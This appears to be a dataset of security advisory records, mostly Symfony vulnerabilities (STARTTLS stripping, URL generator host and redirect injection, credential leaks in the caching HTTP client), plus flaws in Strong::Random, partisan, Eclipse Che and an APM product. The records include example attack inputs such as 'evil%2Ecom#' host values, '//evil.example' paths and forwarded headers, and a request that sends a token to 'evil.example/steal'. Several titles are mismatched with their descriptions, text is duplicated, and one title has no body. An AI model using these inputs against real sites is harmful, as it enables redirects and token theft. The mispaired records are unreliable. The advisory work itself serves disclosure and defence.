Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted. It prevents a network attacker from stripping STARTTLS. But after the server's 220 reply to STARTTLS, the transport started the TLS handshake without checking whether more data had already arrived.

An attacker in the middle of the connection could add cleartext replies right after the 220. The transport then read them as if they came from the encrypted session. The attacker could make the transport skip AUTH, or report a message as sent while the server had rejected it.

Connections that use implicit TLS, with smtps:// or port 465, are not affected. Since Symfony 8.1, the Amazon SES SMTP transport enables require_tls by default on ports other than 465 and 2465. So ses+smtp:// DSNs are affected without setting the option.

The transport now refuses to start TLS when the server sends data right after its answer to STARTTLS, and throws a TransportException instead.

title: UrlGenerator puts the values of host placeholders into the generated URL without encoding them.
desc:
UrlGenerator puts the values of host placeholders into the generated URL without encoding them. Their default requirement, [^.]++, accepts /, @, #, ?, \, % and :. With the host {tenant}.example.com, the value evil%2Ecom# gives https://evil%2Ecom#.example.com/dashboard, which browsers send to evil.com. This works even when requirements are checked. Unicode full stops like 。 have the same effect, since IDNA maps them to ..

Applications are exposed when untrusted values reach host placeholders, for example when they pass the query string of the request to url(). A route that uses RedirectController::redirectAction() with keepQueryParams: true does the same, when the target route has a host placeholder that the redirecting route doesn't define.

UrlGenerator now rejects host placeholder values that contain a character that is forbidden in a host. These characters are C0 controls, space, #, %, /, :, <, >, ?, @, [, \, ], ^, | and DEL. Unicode full stops are rejected too. This check applies whatever strict_requirements is set to. When strict_requirements is false or null, the generator logs an error and returns an empty string instead of throwing. Host placeholder values can still be an IPv6 literal like [::1], but they can't contain a port anymore.

title: With the unanimous access decision strategy, an access_control rule that lists several roles requires all of them.
desc:
With the unanimous access decision strategy, an access_control rule that lists several roles requires all of them. That's the behavior restored by the fix for CVE-2020-5275. Since Symfony 5.4, the access decision manager asked each voter once about all the attributes of a rule. RoleVoter grants access as soon as the user has one of the roles. So a user who had only one of these roles was granted access:

security:
    access_decision_manager:
        strategy: unanimous
    access_control:
- { path: ^/admin, roles: [ROLE_ADMIN, ROLE_AUDITOR] }

Only attributes decided by the same voter were affected. For example, a role combined with allow_if still required both.

With the unanimous strategy, voters are asked about each attribute separately again, as before Symfony 5.4. Access is denied as soon as one of the attributes is denied.

title: When it denormalizes data into a class, the Serializer computes which attributes it may write from the #[Ignore] and #[Groups] metadata.
Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted.
desc:
Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted. It prevents a network attacker from stripping STARTTLS. But when the server rejected the EHLO command, the transport fell back to HELO and skipped that check.

An attacker in the middle of an SMTP connection that uses STARTTLS could answer EHLO with an error and HELO with a success. The transport then sent the sender, the recipients and the whole message in cleartext, and reported success. No AUTH command is sent on that path, so credentials don't leak.

Connections that use implicit TLS, with smtps:// or port 465, are not affected. Since Symfony 8.1, the Amazon SES SMTP transport enables require_tls by default on ports other than 465 and 2465. So ses+smtp:// DSNs are affected without setting the option.

When TLS is required and the connection isn't encrypted, the transport doesn't fall back to HELO anymore. It throws the same exception as when the server doesn't support STARTTLS.

title: Since Symfony 7.4, CachingHttpClient can cache the responses of HTTP clients, for example when caching is enabled in framework.http_client.
desc:
Since Symfony 7.4, CachingHttpClient can cache the responses of HTTP clients, for example when caching is enabled in framework.http_client. Its withOptions() method passes the options to the decorated client only. So credentials set with withOptions(), like auth_bearer, auth_basic, an Authorization header or a Cookie header, reach the server, but CachingHttpClient doesn't see them. They're missing from the cache key. They also miss the rule that keeps a shared cache from storing the responses to requests with an Authorization header. A cacheable response fetched for one user is then served to the next users:

$client->withOptions(['auth_bearer' => $aliceToken])->request('GET', 'https://api.example.com/me'); // Alice's profile
$client->withOptions(['auth_bearer' => $bobToken])->request('GET', 'https://api.example.com/me');   // Alice's profile, from the cache

Applications are affected when they enable caching on a client, set per-user credentials with withOptions(), and request URLs whose responses are cacheable. Credentials passed to request() aren't affected.

Most other options set with withOptions() were ignored too when caching was enabled, because CachingHttpClient forwarded each request with its own defaults. This includes max_redirects, proxy, peer_fingerprint, local_cert, timeout, on_progress and body.

CachingHttpClient::withOptions() now also merges the standard options into its own default options. The cache key, the rules of shared caches and the requests it forwards take them into account. Options that only decorated clients know, like max_retries, are still passed to them only.

Client certificates, proxies and auth_ntlm are now part of the cache key too. When several HTTP clients of FrameworkBundle use the same cache pool, each client gets its own namespace in that pool. So clients with different custom headers don't get the responses of each other anymore.

title: GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() logs a user in programmatically with a Guard authenticator, for example in the registration controllers that…
desc:
GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() logs a user in programmatically with a Guard authenticator, for example in the registration controllers that MakerBundle generated. This method creates the token and stores it, but it calls neither checkPreAuth() nor checkPostAuth() on the user checker of the firewall. Guard authenticators run both checks when they authenticate a request.

As a consequence, an account that a user checker rejects in checkPostAuth() could still be logged in through this method, for example an expired account.

Applications are affected when they use Guard with a custom user checker that rejects users in checkPostAuth(), and log users in with authenticateUserAndHandleSuccess(). The default user checker also rejects users of the deprecated User class whose credentials expired. This is the issue of GHSA-8f57-m8wj-x65w, for the Guard component of Symfony 5.4. Guard was removed in Symfony 6.0.

GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() now calls the checkPostAuth() method of the user checker of the firewall before it stores the token. AuthenticatorManager::authenticateUser() does the same since the fix for GHSA-8f57-m8wj-x65w. Like authenticateUser(), authenticateUserAndHandleSuccess() doesn't call checkPreAuth(). Programmatic logins skip this check on purpose, for example right after a registration. SecurityBundle now gives the user checkers of the firewalls to the handler, so both symfony/security-guard and symfony/security-bundle must be updated.

As a consequence, an exception thrown by checkPostAuth() now comes out of authenticateUserAndHandleSuccess(). Code that logs users in programmatically may need to catch it.

title: NoPrivateNetworkHttpClient accepts a list of subnets to block instead of its default one.
desc:
NoPrivateNetworkHttpClient accepts a list of subnets to block instead of its default one. When that list contains an IPv6 entry, the client lets IpUtils::checkIp() decide for every address. Before Symfony 6.4.50, 7.4.23 and 8.1.11, checkIp() didn't match an IPv4-mapped address like ::ffff:127.0.0.1 against IPv4 subnets. Such an address connects to the IPv4 host it embeds. So http://[::ffff:127.0.0.1]/, or a host name whose AAAA record contains a mapped address, reaches a blocked IPv4 host:

$client = new NoPrivateNetworkHttpClient(HttpClient::create(), ['10.0.0.0/8', '127.0.0.0/8', '192.168.0.0/16', 'fc00::/7', '::1/128']);
$client->request('GET', 'http://127.0.0.1/');          // blocked
$client->request('GET', 'http://[::ffff:127.0.0.1]/'); // sent to 127.0.0.1

The default list is not affected, since it contains ::ffff:0:0/96.

IpUtils::checkIp() now checks an IPv4-mapped address against IPv4 subnets as the IPv4 host it embeds. Symfony 6.4.50, 7.4.23 and 8.1.11 already do so since the fix for GHSA-xg2q-4rrq-657q, and 5.4 now does too.

The fix is in symfony/http-foundation, so updating symfony/http-client alone isn't enough. On 5.4, trusted proxies and the ips of request matchers now also match IPv4-mapped addresses through IPv4 ranges, as on 6.4 and up. NoPrivateNetworkHttpClient also blocks IPv4-mapped addresses when its custom subnets have no IPv4 entry, since such lists block every IPv4 host.

title: Since Symfony 7.4, framework.http_client.scoped_clients can enable caching on a scoped client.
desc:
Since Symfony 7.4, framework.http_client.scoped_clients can enable caching on a scoped client. FrameworkBundle then puts a CachingHttpClient inside the ScopingHttpClient, with the options of the scope as default options. CachingHttpClient merges them into every request. So the credentials of the scope, like auth_bearer, auth_basic or an Authorization header, are also sent to URLs outside the scope:

framework:
    http_client:
        scoped_clients:
            github.client:
                base_uri: 'https://api.github.com'
                headers: { Authorization: 'token GH-SECRET' }
                caching: { enabled: true }

$githubClient->request('GET', 'https://evil.example/steal'); // sent with "Authorization: token GH-SECRET"

Every option of the scope applies outside of it, not only the credentials, for example verify_peer: false, a client certificate, proxy or resolve. Without caching, ScopingHttpClient sends no option of the scope to evil.example. Applications are affected when a scoped client with caching enabled requests a URL that an attacker can influence, absolute URLs included.

The CachingHttpClient of a scoped client is now registered without default options. ScopingHttpClient already applies them to the requests that match the scope.

title: The fix for CVE-2026-45065 (GHSA-72xp-p242-47p9) anchored the requirements that UrlGenerator checks parameter values against.
desc:
The fix for CVE-2026-45065 (GHSA-72xp-p242-47p9) anchored the requirements that UrlGenerator checks parameter values against. That check doesn't run when framework.router.strict_requirements is null, which the routing recipe sets in the prod environment. There, a first placeholder whose value starts with / still gives a protocol-relative URL, as in the original report:

path('blog_rss', {_locale: '/evil.com'})  =>  //evil.com/blog/rss.xml

Requirements that accept /, like .+, give such URLs in every environment.

Applications are exposed when untrusted values reach these parameters, for example when they pass the query string of the request to path() or url(). A route that uses RedirectController::redirectAction() with keepQueryParams: true does the same, when the target route has a placeholder that the redirecting route doesn't define.

UrlGenerator now encodes the leading // of a URL that has no scheme and host as /%2F. It also rejects parameters that add %2E or %2E%2E segments to the path, which browsers resolve like . and ... These checks apply whatever strict_requirements is set to. When strict_requirements is false or null, the generator logs an error and returns an empty string instead of throwing.

title: The router redirects a request to the same URL with or without its trailing slash, or with the scheme that a route requires.
desc:
The router redirects a request to the same URL with or without its trailing slash, or with the scheme that a route requires. To do so, the matcher returns RedirectController::urlRedirectAction() with the path info of the request as path. Since Symfony 5.4.44, 6.4.12 and 7.1.5, urlRedirectAction() turns a path that starts with // into <scheme>://..., so that protocol-relative targets configured in routes work. The path info of a request starts with // when its URI does. So these redirects send the browser to the host written at the start of the path:

GET https://app.example//evil.example/edit/  =>  301 Location: https://evil.example/edit

This affects routes whose path starts with a placeholder that accepts /, like /{path}/edit with the .+ requirement. The trailing-slash redirect applies to all of them, and the scheme redirect to the ones that require a scheme. A front controller in a subdirectory doesn't prevent it.

The matcher now encodes the slash or backslash that follows the leading slash of the path it redirects to, as %2F or %5C. It also does so when tabs or newlines come in between. The target route still matches it, and protocol-relative targets configured in routes keep working.

The matchers of the Routing component encode it too before calling RedirectableUrlMatcherInterface::redirect(), so that other implementations of this method get the encoded path as well.

title: The fixes for CVE-2026-135804 (GHSA-cpww-5vpx-72x7) bound the regex work of a JsonCrawler::find() call, and evaluate filters and absolute queries once per call.
The fix for CVE-2026-123339 (GHSA-wg5q-m2ww-f3c9) restores the router context of the main request after an inline fragment, but the cause of that issue is still there.
desc:
The fix for CVE-2026-123339 (GHSA-wg5q-m2ww-f3c9) restores the router context of the main request after an inline fragment, but the cause of that issue is still there. A page can render an inline fragment with render() in Twig, or with an ESI tag when no gateway cache is used. While the fragment runs, SubRequestHandler adds 127.0.0.1 to the trusted proxies of every request. Code that reads the main request during that time trusts its X-Forwarded-* and Forwarded headers if the main request came from 127.0.0.1.

Symfony itself reads the main request there:
- asset() takes the base path and the scheme of the main request. With X-Forwarded-Prefix: //evil.example, asset('build/app.js') returns //evil.example/build/app.js, a script loaded from another host. Request::getBasePath() keeps its first result, so when it's first computed inside the fragment, the later asset() calls of the page return such URLs too.
- absolute_url() in Twig, through UrlHelper, takes the host and the scheme of the main request from X-Forwarded-Host and X-Forwarded-Proto.

When a shared cache stores the page, every visitor gets these URLs. With asset(), the page then runs scripts from a host chosen by the attacker.

This affects applications reached over HTTP from 127.0.0.1 when that address isn't a trusted proxy. That's the case behind a TLS terminator, a reverse proxy or an HTTP cache running on the same host. When framework.trusted_proxies is not configured, which is the default, every forwarded header is trusted during that window, X-Forwarded-Prefix included. Configuring framework.trusted_hosts doesn't help with asset(), since the prefix is not a host. Applications that get requests directly through php-fpm or mod_php are not affected, and neither are those behind a proxy on another host. REMOTE_ADDR is not 127.0.0.1 there.

SubRequestHandler doesn't change the trusted proxies of every request anymore. Only the requests it builds, and the requests copied from them, trust 127.0.0.1. While a fragment renders, the main request keeps ignoring the forwarded headers sent by the client.

symfony/http-kernel now requires the version of symfony/http-foundation that contains this fix.

desc: A flaw was found in rsyslog. title: Strong::Random versions through 0.96 for Perl allow every later rand output to be predicted from three earlier ones.
desc:
Strong::Random versions through 0.96 for Perl allow every later rand output to be predicted from three earlier ones.

The generator keeps its state in a single number. Each call multiplies the state by a factor derived from it, and the returned digits encode that factor, so three consecutive outputs determine the state however the generator was seeded. Outputs are also biased: the first digit after the decimal point is never zero, so rand(256) never returns 1 to 24.

An attacker who sees three consecutive outputs can predict the tokens, passwords or key bytes that the same object later issues to other users.

title: Deserialization of Untrusted Data vulnerability in lasp-lang partisan allows an unauthenticated remote attacker to abort the Erlang VM of a node via Excessive Allocation.
desc:
Deserialization of Untrusted Data vulnerability in lasp-lang partisan allows an unauthenticated remote attacker to abort the Erlang VM of a node via Excessive Allocation. partisan_peer_service_server:handle_info/2 decodes every frame that arrives on the peer listener with binary_to_term/1, without the safe option, before handle_inbound/2 interprets the message and before any peer authentication takes place. TLS is off by default and the listener accepts connections from any host, so one frame that names more atoms than the atom table holds aborts the VM. partisan_peer_service_client:handle_info/2 decodes frames from the server side of a connection the same way.

The decode also materializes funs, ports and references the frame encodes and inflates compressed terms. The demonstrated impact is denial of service. partisan does not invoke decoded funs, so code execution was not shown.

This issue affects partisan: from 3.0.0 before 6.4.0.

title: In Eclipse Che versions 7.61.0 through 7.124.0 three related defects in the SCM-OAuth flow, chain into a Medium-severity finding: 1.
desc:
In Eclipse Che versions 7.61.0 through 7.124.0 three related defects in the SCM-OAuth flow, chain into a Medium-severity finding:



1. Open redirect (CWE-601) — `EmbeddedOAuthAPI.callback()` and the OAuth1 callback issue `307 Temporary Redirect` to whatever URL was carried in the `redirect_after_login` field of the OAuth `state` parameter. The value is fully attacker-controlled and never compared against an allow-list of permitted hosts.



2. Missing CSRF nonce in OAuth `state` (CWE-352) — `OAuthAuthenticator.prepareState()` builds the `state` parameter solely by URL-encoding the original request's query string. No random nonce is bound to the user's session, so an attacker can pre-compute a callback URL carrying _their own_ SCM authorization `code` and have a logged-in victim open it. `callback()` then stores the attacker's SCM token under the victim's Che identity (`personalAccessTokenManager.store(...)`).



3. Mutable field on a `@Singleton` (CWE-362 / CWE-488) — `EmbeddedOAuthAPI` is `@Singleton` but stores the per-request `redirect_after_login` value into the instance field `private String redirectAfterLogin`. Any user's `authenticate()` call overwrites the field for all concurrent users; the `access_denied` error-path of `callback()` then redirects to the _last writer's_ URL.

title: In Application Performance Management versions before 9.60 IP4, The application is vulnerable to cross-site scripting wherein the application does not properly validate the input…
desc:
In Application Performance Management versions before 9.60 IP4, The application is vulnerable to cross-site scripting wherein the application does not properly validate the input parameters, allowing scripts to be injected and then executed in the context of a user’s browser. This can lead to the attacker stealing sensitive information, impersonating users, or performing actions on their behalf.  Also, the application may also be vulnerable to the below attacks:

• Link Injection – This occurs when an attacker inserts a malicious link into a webpage, often in a way that makes it appear legitimate. When user clicks on the link, they may be directed to a harmful website or prompted to download malicious files.



• Frame Injection – This attack involved embedding a webpage within an invisible frame on another site, User interacts with what appears to be a legitimate site, but their actions are performed on the malicious page, potentially leading to unintended actions or data theft.

title: Application Performance Management 9.60 patch versions before IP4 are affected.
desc:
Application Performance Management 9.60 patch versions before IP4 are affected. This issue seems to be present throughout the application, as several endpoints or functionalities that are restricted to Admin users can be directly accessed by Regular users. The authorization method of the application can be bypassed allowing users to perform unauthorized actions to their role. The application supports different levels of access. The application performs authorization checks to keep users from accessing functionality outside of their role such as create, verify, and/or repair. 




This authorization method can be bypassed. During VA testing, it was found that under the User Reports inside the Applications menu, it is possible to  create links and different reports. However, the creation of custom links, Excel reports, and service reports are restricted to admin users. Hence, it is possible for regular users with the least privileges to directly access these 

pages and the application allows them to further use these restricted functionalities.
